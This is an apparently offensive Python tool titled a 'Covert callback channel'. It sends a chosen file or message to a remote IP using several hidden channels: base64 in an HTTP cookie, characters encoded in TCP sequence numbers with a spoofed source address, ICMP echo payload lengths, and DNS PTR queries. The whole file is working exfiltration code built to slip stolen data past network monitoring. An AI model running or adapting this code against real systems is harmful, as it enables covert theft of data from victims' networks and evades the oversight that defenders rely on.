# -*- coding: utf-8 -*-

##############################3
# Written By: bitxer
# Distributed under the Apache License 2.0 (the "License").
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# You should have received a copy of the Apache License 2.0
# along with this program.
# If not, see <http://www.apache.org/licenses/LICENSE-2.0>.
##################################################

from scapy.all import IP, send, TCP, ICMP, UDP, DNS, DNSQR
from base64 import b64encode
from argparse import ArgumentParser, ArgumentTypeError
from random import random
import ipaddress

class Callback:
    @property
    def destination(self):
        return self._dst
    
    @destination.setter
    def dst(self, dst):
        self._dst = dst

    @property
    def data(self):
        return self._data

    @data.setter
    def data(self, exfildata):
        if isinstance(exfildata, str):
            exfildata = exfildata.encode()
        self._data = b64encode(exfildata).decode()
    
class HTTPCallback:
    def __init__(self, callback):
        self._dst = callback.dst
        self._data = callback.data

    def send(self):
        import requests
        headers = {
                'Cookie' : '_sid={}'.format(self._data)
                }
        response = requests.get('http://{}'.format(self._dst), headers=headers)

    def sendfinal(self):
        pass

class TCPCallback:
    def __init__(self, callback, port, key):
        self._port = port
        self._key = key
        self._dst = callback.dst
        self._data = callback.data

    def _craft(self, data):
        sport = int(random() * 10000000) % 65535
        return IP(src='127.0.0.1',dst=self._dst)/TCP(sport=sport, dport=self._port, seq=data)/'innocent'

    def send(self):
        data = self._data
        for c in data:
            seq = ord(c) * self._key
            packet = self._craft(seq)
            send(packet)
        
    def sendfinal(self):
        packet = self._craft(self._key * self._key)
        send(packet)

class ICMPCallback:
    def __init__(self, callback, key):
        self._dst = callback.dst
        self._data = callback.data
        self._key = key
        self.segment = 'abcdefghijklmnopqrstuvw'
        self.segment_len = len(self.segment)

    def _craft(self, data):
        payload = self.segment * int(data / self.segment_len)
        payload = payload + payload[:(data % self.segment_len)]
        return IP(dst=self._dst)/ICMP(type=8)/payload

    def send(self):
        data = self._data
        for c in data:
            c = ord(c)
            packet = self._craft(c)
            send(packet)
    
    def sendfinal(self):
        data = int(self._key / ord(self._data[-1]))
        packet = self._craft(data)
        send(packet)

class DNSCallback:
    def __init__(self, callback, key):
        self._dst = callback.dst
        self._data = callback.data
        self._key = key

    def _craft(self, data):
        ip = ipaddress.ip_address(data).reverse_pointer
        return IP(dst=self._dst)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=ip, qtype='PTR'))

    def send(self):
        data = self._data
        for c in data:
            c = ord(c) * self._key
            packet = self._craft(c)
            send(packet)
    
    def sendfinal(self):
        send(self._craft(self._key * self._key))

def main(args):
    _callback = Callback()
    _callback.dst = args.destination

    message = args.message
    if args.file:
        with open(args.file, 'rb') as f:
            message = f.read()
    
    _callback.data = message

    proto = args.protocol
    if proto == 'http':
        exfil = HTTPCallback(_callback)
    elif proto == 'tcp':
        exfil = TCPCallback(_callback, port=args.port, key=args.key)
    elif proto == 'icmp':
        exfil = ICMPCallback(_callback, key=args.key)
    elif proto == 'dns':
        exfil = DNSCallback(_callback, key=args.key)

    exfil.send()
    exfil.sendfinal()

def positiveint(val):
    try:
        if int(val) < 0:
            raise ArgumentTypeError('%s is an invalid value'%val)
    except:
        raise ArgumentTypeError('%s is an invalid value'%val)
    return int(val)

if __name__ == '__main__':
    parser = ArgumentParser(description="Covert callback channel")
    parser.add_argument('-d', '--destination', metavar='ip', default='127.0.0.1', help='Destination IP of callback server')
    parser.add_argument('-p', '--port', metavar='port', default=4444, type=positiveint, help='Destination port number for tcp-based covert channel')
    parser.add_argument('-k', '--key', metavar='key', default=65535, type=positiveint, help='Key used to encrypt message send through TCP-based covert channel')
    parser.add_argument('-t', '--protocol', metavar='proto', default='http', choices=['http', 'tcp', 'icmp', 'dns'], help='Protocol to exfiltrate Data using')
    messagedata = parser.add_mutually_exclusive_group(required=True)
    messagedata.add_argument('-f', '--file', metavar='path', help='File to exfiltrate')
    messagedata.add_argument('-m', '--message', metavar='msg', help='Message to exfiltrate')
    args = parser.parse_args()
    main(args)
